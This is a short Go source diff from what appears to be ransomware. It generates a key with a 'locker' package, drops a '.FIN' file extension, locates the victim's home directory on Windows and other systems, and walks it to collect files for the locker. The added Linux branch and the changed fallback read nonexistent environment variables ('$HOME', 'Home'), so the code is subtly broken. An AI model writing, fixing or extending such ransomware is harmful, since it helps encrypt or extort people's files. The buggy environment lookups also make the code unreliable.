@@ -11,18 +11,20 @@ import (
 func main() {
 	var files []string
 	var home string
-	var ext = ".FIN"
 
 	newkey := locker.KeyGen()
 
-	// Logic to determine if host is running Windows
+	// Grabbing path to users home directory.
 	if runtime.GOOS == "windows" {
 		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
 		if home == "" {
 			home = os.Getenv("USERPROFILE")
 		}
+	} else if runtime.GOOS == "linux" {
+		home = os.Getenv("$HOME")
+
 	} else {
-		home = os.Getenv("HOME")
+		home = os.Getenv("Home")
 	}
 
 	err := filepath.Walk(home, locker.Walker(&files))
